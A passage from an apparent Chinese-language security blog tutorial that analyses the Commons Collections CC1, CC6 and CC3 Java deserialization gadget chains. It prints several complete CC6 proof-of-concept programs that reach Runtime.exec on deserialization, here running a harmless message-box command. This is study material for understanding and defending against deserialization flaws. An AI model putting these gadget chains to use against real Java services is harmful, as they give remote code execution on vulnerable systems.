class="variable">o</span> <span class="operator">=</span> annotationconstructor.newInstance(Override.class, mapproxy);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>剩下的地方一模一样，这次的CC1分析就告一段落！写了一坨屎真的很抱歉，大概只有自己看得懂吧，希望别人也能看懂，我的表述能力已经发挥到了极致了。。。ORZ<br>ps:在jdk1.8.0.71中修复了<code>AnnotationInvocationHandler</code>类的readObject方法，因此其他的链出现了</p>
<h2 id="1X2-2-CC6"><a href="#1X2-2-CC6" class="headerlink" title="1X2.2 CC6"></a>1X2.2 CC6</h2><p>版本限制：全版本<br>为什么会出现CC6呢，在java8u71大版本中AnnotationInvocationHandler.readObject被修改了，没有上述CC1的调用链了，因此想出来了一条不受版本控制的链CC6<br>在开始分析之前我们可以看一下Ysoserial上的CC6是怎么个调用方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671176994769-3cca8ecb-745d-4dc1-83e6-49232281b651.png#averageHue=%23fefefd&clientId=u3440f526-03c8-4&from=paste&height=339&id=uf9d6bbb1&name=image.png&originHeight=424&originWidth=1297&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35156&status=done&style=none&taskId=ub6b51b3e-dbd0-4642-803f-6bff7aa995f&title=&width=1037.6" alt="image.png"><br>可以看到调用了<code>HashMap.hash()</code>，这一个方法假如认真看了我的文章的人，应该都会熟悉的吧，在刚开始反序列化中讲	URLDNS链的时候我就说到了，因此整条链的难度也不大，因为后半段和CC1一样，同样是从Lazymap.get往下延伸出来的，因此我们分析的起点只需要看是谁调用了<code>.get()</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671177617580-8e1b4d51-698f-4fa9-9c32-1b36f0cb75d1.png#averageHue=%232f2f2e&clientId=u3440f526-03c8-4&from=paste&height=330&id=u0ab6c198&name=image.png&originHeight=412&originWidth=1012&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41753&status=done&style=none&taskId=uc1386b4b-47eb-43ec-b9ff-e54705de006&title=&width=809.6" alt="image.png"><br>这里就不说是怎么找到TiedMapEntry的了，就是一个个的看了，在它的getValue方法中调用了map.get方法，那又在哪儿调用了getValue方法呢：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671177939686-323ef936-1e87-445c-b263-da1b8a222f65.png#averageHue=%232d2c2c&clientId=u3440f526-03c8-4&from=paste&height=191&id=ua42e900e&name=image.png&originHeight=239&originWidth=1133&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33437&status=done&style=none&taskId=ud3ed2a91-0ce2-4e39-ad99-9194f5d9d96&title=&width=906.4" alt="image.png"><br>答案是该类的hashCode方法，看到hashCode就想起了URLDNS链了吧，因此现在要找谁调用了hashCode方法，那肯定就是HashMap集合了，在URLDNS链中也用到了它重写的readObject类中：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671178133242-2fe53dd4-e7be-4c1d-9bba-f6ea240f88e3.png#averageHue=%232c2c2b&clientId=u3440f526-03c8-4&from=paste&height=300&id=u0128b7f9&name=image.png&originHeight=375&originWidth=1027&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46356&status=done&style=none&taskId=uaadd16cb-1daa-4799-a467-83524ccc85c&title=&width=821.6" alt="image.png"><br>调用了hash方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671178147386-5ba6b315-821a-4d86-b9e3-c86228b2817c.png#averageHue=%232c2c2c&clientId=u3440f526-03c8-4&from=paste&height=166&id=u9778ce17&name=image.png&originHeight=207&originWidth=1084&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17486&status=done&style=none&taskId=ue2e22032-36c6-45ed-b273-4b175a49404&title=&width=867.2" alt="image.png"><br>最后调用key.hashCode,key就是我们可控参数，我们只需要让key等于<code>TiedMapEntry</code>即可！因此可以开始编写CC6链雏形了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot; mshta vbscript:msgbox(\&quot;恭喜你成功完成CC1！\&quot;,64,\&quot;Congratulations！\&quot;)(window.close)&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面我特意把unserialize注释了，但是也可以弹窗：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671178881113-f24e5720-5211-4165-91ee-0d72f632d72b.png#averageHue=%2341403f&clientId=u3440f526-03c8-4&from=paste&height=392&id=ud006e975&name=image.png&originHeight=490&originWidth=1408&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125886&status=done&style=none&taskId=u75796da6-4075-4e77-93a9-c5222857274&title=&width=1126.4" alt="image.png"><br>原因其实和URLDNS链一模一样，因为在hashmap.put的时候也调用了hash方法，进而调用hashCode，因此解决方法也一样，我们需要先把<br><code>Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);</code><br>这句话中的chainedTransformer改掉，因为最终调用的是<code>factory.transform(key);</code><br>factory也就是chainedtransformer，只要在put前修改掉，然后put后改回来，这样反序列化时就会触发，序列化时就不会触发，因此做出如下修改：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot; mshta vbscript:msgbox(\&quot;恭喜你成功完成CC6！\&quot;,64,\&quot;Congratulations！\&quot;)(window.close)&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer</span></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line"><span class="comment">//        serialize(hashMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是仍然发现无法弹出计算机，我们重点放回Lazymap.get上：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671180935931-a914dc9f-8f5a-4caa-a762-2f1ea8215650.png#averageHue=%232d2c2b&clientId=u3440f526-03c8-4&from=paste&height=174&id=u88f0b3b9&name=image.png&originHeight=217&originWidth=957&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34505&status=done&style=none&taskId=uf75f93d4-b965-42be-97a6-7781dff5092&title=&width=765.6" alt="image.png"><br>在这里有一层判断，当map也就是我们传入那个空map的键值对为空时，才会进入if内，也就是我们的目标，但是在第一轮put的时候为空，然后他调用了<code>map.put(key, value);</code><br>给他加了aaa这个键进去，然后在反序列化的时候：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671181008114-95f9cb78-efd9-4f9b-bae7-16cf02323194.png#averageHue=%232f2b2b&clientId=u3440f526-03c8-4&from=paste&height=197&id=u3d82f002&name=image.png&originHeight=246&originWidth=1174&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43039&status=done&style=none&taskId=ua38b9c22-4d30-42c0-9b10-e81c4862c57&title=&width=939.2" alt="image.png"><br>由于序列化加了aaa，因此反序列化的时候就进不去if判断，因此没有执行<code>factory.transform</code>，解决办法也很简单，在put后再移除掉即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot; mshta vbscript:msgbox(\&quot;恭喜你成功完成CC6！\&quot;,64,\&quot;Congratulations！\&quot;)(window.close)&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer			</span></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671181124179-a9e1da5d-5a0a-47d6-af79-744f3808f45b.png#averageHue=%233f3e3d&clientId=u3440f526-03c8-4&from=paste&height=410&id=u05622a18&name=image.png&originHeight=512&originWidth=1540&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98472&status=done&style=none&taskId=u16f8b78f-8c0b-476f-bbca-5807a98a11d&title=&width=1232" alt="image.png"><br>分析结束~~以上3条链的流程如下，很清晰<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671188776724-e73e3746-6be2-46bf-8a52-2fb1999f2dfa.png#averageHue=%23f6f6f6&clientId=u3440f526-03c8-4&from=paste&height=564&id=u1c024889&name=image.png&originHeight=705&originWidth=1510&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110350&status=done&style=none&taskId=u0550b906-ba2c-4354-b013-98325a0fa38&title=&width=1208" alt="image.png"></p>
<h2 id="1X2-3-CC3"><a href="#1X2-3-CC3" class="headerlink" title="1X2.3 CC3"></a>1X2.3 CC3</h2><p>CC3就和CC1、CC6不同了，后者是执行命令，而前者是通过动态加载类，然后实例化类达到执行静态代码块的目的，废话不多说进入状态分析<br>已经提到过CC3的执行方法和其他2条链方式有些许不同，CC3采用的是动态加载类，也就是上面讲基础时用到过的<code>ClassLoder.defineclass</code>,因此我们寻找谁调用了defineclass方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671196351483-fe173258-eacf-45bd-9d70-76a26e245410.png#averageHue=%232d2c2c&clientId=udbbfbc4e-b37b-4&from=paste&height=207&id=uf7e98cec&name=image.png&originHeight=259&originWidth=1017&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30551&status=done&style=none&taskId=u65157ab5-6417-4f55-94e9-77a78c9077a&title=&width=813.6" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671196380581-687e89f4-e8d5-4135-86ce-d2371b5000e4.png#averageHue=%23466046&clientId=udbbfbc4e-b37b-4&from=paste&height=230&id=ued61bcf3&name=image.png&originHeight=288&originWidth=1682&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63449&status=done&style=none&taskId=ua57c0137-7e09-4f6a-84a1-5915d059926&title=&width=1345.6" alt="image.png"><br>在TemplatesImpl.TransletClassLoader里调用了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671196443484-a26f3597-adda-489f-899d-bd725c4f184b.png#averageHue=%232c2b2b&clientId=udbbfbc4e-b37b-4&from=paste&height=297&id=u9b35b136&name=image.png&originHeight=371&originWidth=1125&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27118&status=done&style=none&taskId=u78a2e156-a191-48b2-a072-4eeacdc3901&title=&width=900" alt="image.png"><br>继续跟进该类，看看该类的defineClass在哪被调用：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671196499903-202bfedc-44fc-48cd-8d03-79d57a775b5f.png#averageHue=%232d2c2b&clientId=udbbfbc4e-b37b-4&from=paste&height=211&id=u07d64af2&name=image.png&originHeight=264&originWidth=923&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31592&status=done&style=none&taskId=u523f128e-06d5-426a-a162-d6252bc19ee&title=&width=738.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671196494802-f0e8d2ea-c366-4a8f-b9c2-c756fd2e9b4e.png#averageHue=%232d2c2c&clientId=udbbfbc4e-b37b-4&from=paste&height=186&id=u533f3720&name=image.png&originHeight=232&originWidth=1067&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39202&status=done&style=none&taskId=u19789b59-1302-4209-976c-db627879fdf&title=&width=853.6" alt="image.png"><br>在defineTransletClasses类中被调用<code>loader.defineClass</code>，在调用之前有几个小判断需要留意：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671196606168-6cfe7ee2-070b-4a09-88eb-2084be2a8d34.png#averageHue=%232d2c2b&clientId=udbbfbc4e-b37b-4&from=paste&height=129&id=u3d3a9c57&name=image.png&originHeight=161&originWidth=761&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22475&status=done&style=none&taskId=u280f65c1-9983-4dc9-bd6a-791fd481834&title=&width=610" alt="image.png"><br>首先<code>_bytecodes</code>属性不能为空否则跑出异常，因此需要反射赋值<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671196624730-15555408-3b36-4a6c-a4fb-ca422f593d73.png#averageHue=%232e2d2c&clientId=udbbfbc4e-b37b-4&from=paste&height=154&id=uc30f5e1a&name=image.png&originHeight=192&originWidth=1158&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31116&status=done&style=none&taskId=ud059ae2e-b5c4-4780-837f-a6821c86e83&title=&width=926.4" alt="image.png"><br>调用<code>_tfactory.getExternalExtensionsMap()</code>，因此也不能为空，跟进看看这个属性有没有被赋值<img 